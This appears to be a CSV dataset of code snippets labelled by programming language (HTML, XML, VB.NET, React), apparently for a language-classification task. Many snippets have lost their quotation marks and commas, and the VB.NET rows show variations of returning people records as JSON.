correct,guess,snippet
HTML,html,"    function <strong>createTestData </strong>() {      IDB.add( books [        {id: 006251587X title: Weaving the Web year: 2000 edition: 2}        {id: 0465026567 title: Gödel Escher Bach year: 1999}        {id: 0465030793 title: I Am a Strange Loop year: 2008}      ]);    }  </script></head><body> <h1>Working with IndexedDB</h1> <h2>Creating and Clearing a Database</h2>  <ul>    <li><button type=button onclick=IDB.createEmptyDB(['books']).then            ( createTestData())>Generate</button> test data</li>    <li><button type=button     onclick=IDB.clearDB()>Clear</button> database</li>  </ul></body></html>"
XML,xml,"<Project Sdk=Microsoft.NET.Sdk>  <PropertyGroup>    <TargetFramework>netstandard2.0</TargetFramework>  </PropertyGroup>  <ItemGroup>    <PackageReference Include=Xamarin.Forms Version=2.5.0.122203 />  </ItemGroup>  <ItemGroup>    <PackageReference Update=NETStandard.Library Version=2.0.1 />  </ItemGroup></Project>"
XML,xml,"<Project Sdk=Microsoft.NET.Sdk>  <PropertyGroup>    <TargetFramework>netstandard2.0</TargetFramework>  </PropertyGroup>  <ItemGroup>    <PackageReference Include=SkiaSharp Version=1.59.3 />    <PackageReference Include=SkiaSharp.Views.Forms Version=1.59.3 />    <PackageReference Include=Xamarin.Forms Version=2.5.0.122203 />  </ItemGroup>  <ItemGroup>    <PackageReference Update=NETStandard.Library Version=2.0.1 />  </ItemGroup></Project>"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult        Dim peoples = From c In db.dtb_people.OrderBy(Function(x) x.c_lastname).ToList   Return New JsonResult With {.Data = peoples .JsonRequestBehavior = JsonRequestBehavior.AllowGet}End Function    "
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult        Dim peoples As New List(Of people)   For Each c As dtb_people In db.dtb_people.OrderBy(Function(x) x.c_lastname).ToArray       Dim peep As New people       peep.firstname = c.c_firstname       peep.lastname = c.c_lastname       peep.id = c.c_Id       peoples.Add(peep)   Next    Return Json(peoples JsonRequestBehavior.AllowGet) End Function    Public Class class_people        <JsonProperty(PropertyName:=fname)> Public Property firstname As String        <JsonProperty(PropertyName:=lname)> Public Property lastname As String        <JsonProperty(PropertyName:=id)> Public Property id As IntegerEnd Class"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult    Dim c As Object = From c In db.dtb_people.OrderBy(Function(x) x.c_lastname).ToList     Dim q = New With {    .firstname = c.c_firstname    .lastname = c.c_lastname    .id = c.c_Id    }    Return Json(q JsonRequestBehavior.AllowGet)End Function"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult    Dim q As Object = From c In db.dtb_people.OrderBy(Function(x) x.c_lastname).ToList Select New With {    .firstname = c.c_firstname    .lastname = c.c_lastname    .id = c.c_Id    }    Return Json(q JsonRequestBehavior.AllowGet)End Function"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult    Dim q As Object = (From c In db.dtb_people.Where(Function(x) x.c_Id = id) Select New With {        .firstname = c.c_firstname        .lastname = c.c_lastname        .id = c.c_Id    }).Single()    Return Json(q JsonRequestBehavior.AllowGet)End Function"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult    Dim c As dtb_people = db.dtb_people.Where(Function(x) x.c_Id = 1).Single    q = New With {        .firstname = c.c_firstname        .lastname = c.c_lastname        .id = c.c_Id    }    Return Json(q JsonRequestBehavior.AllowGet)End Function"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult    Dim c As dtb_people = db.dtb_people.Where(Function(x) x.c_Id = 1).Single    Dim d As New Dictionary(Of String String) From {         {firstname c.c_firstname}         {lastname c.c_lastname}         {id c.c_Id}     }    Return Json(d JsonRequestBehavior.AllowGet)End Function"
VB.NET,vb.net,"Function get_people_jsonresult(Optional id As Integer = 0) As JsonResult    Dim c As dtb_people = db.dtb_people.Where(Function(x) x.c_Id = 1).Single    'multiline string literal    Dim jsonstr As String = {    'firstname':' + c.c_firstname + '    'lastname':' + c.c_lastname + '    'id': + c.c_Id.ToString +     }   Dim d As Dictionary(Of String String) = _       JsonConvert.DeserializeObject(Of Dictionary(Of String String))(jsonstr)   Return Json(d JsonRequestBehavior.AllowGet)End Function"
VB.NET,vb.net,"Function get_people_ContentResult(Optional id As Integer = 0) As ContentResult    Dim c As dtb_people = db.dtb_people.Where(Function(x) x.c_Id = 1).Single    Dim jsonstr As String = {    firstname: + c.c_firstname +     lastname: + c.c_lastname +     id: + c.c_Id.ToString +     }    Return Content(jsonstr.Replace(vbCrLf ) application/json)End Function"
VB.NET,vb.net,"Function get_people_ContentResult(Optional id As Integer = 0) As ContentResult    Dim c As dtb_people = db.dtb_people.Where(Function(x) x.c_Id = 1).Single    Dim jsonstr As JObject = New JObject(        New JProperty(firstname c.c_firstname)        New JProperty(lastname c.c_lastname)        New JProperty(id c.c_Id)    )    Return Content(jsonstr.ToString() application/json)End Function"
VB.NET,vb.net,"Function get_people_string(Optional id As Integer = 0) As String    Dim c As dtb_people = db.dtb_people.Where(Function(x) x.c_Id = id).Single    Dim m As Object = New With {.firstname = c.c_firstname .lastname = c.c_lastname .id = c.c_Id}    Dim serializer As New Script.Serialization.JavaScriptSerializer()    Return serializer.Serialize(m)End Function"
VB.NET,vb.net,"Function get_people_string(Optional id As Integer = 0) As String    Dim jsonstr2 As String = ${{        'firstname': '{c.c_firstname}'        'lastname':'{c.c_lastname}'         'id':{c.c_Id.ToString}    }}    Response.Clear()    Response.ContentType = application/json; charset=utf-8    Response.Write(jsonstr)    Response.End()End Function"
VB.NET,vb.net,"Function get_people_ContentResult(Optional id As Integer = 0) As String    Dim d As New Dictionary(Of String String) From {         {James 9001}         {Jo 3474}         {Jess 11926}     }    Return JsonConvert.SerializeObject(d Formatting.Indented)End Function"
React,react,"public render(): React.ReactElement<IReactTesterProps> {   return (        <form >     <h1>Contact IT Department</h1>     <fieldset className={styles.formGroup}>       <label htmlFor='formName' title='Full Name:' >Full Name:</label>       <input id='formName' className='form-input' name='name' type='text' ref='formName' required onChange={this.handleChange} value={this.state.name} />     </fieldset>          <fieldset className={styles.formGroup}>     <label htmlFor='formName' title='Full Name:' >Email:</label>       <input id='formEmail' className='form-input' name='email' type='email' required onChange={this.handleChange} value={this.state.email} />     </fieldset>          <fieldset className={styles.formGroup}>     <label htmlFor='formName' title='subject:' >subject:</label>       <input id='formSubject' className='form-input' name='subject' type='text' required onChange={this.handleChange} value={this.state.subject} />     </fieldset>          <fieldset className={styles.formGroup}>     <label htmlFor='formName' title='Full Name:' >Message:</label>       <textarea id='formMessage' className='form-textarea' name='message' required onChange={this.handleChange}></textarea>     </fieldset>          <div className={styles.formGroup}>       <input id='formButton' className={styles.btn} type='submit' placeholder='Send message' />     </div>   </form>     ); }"
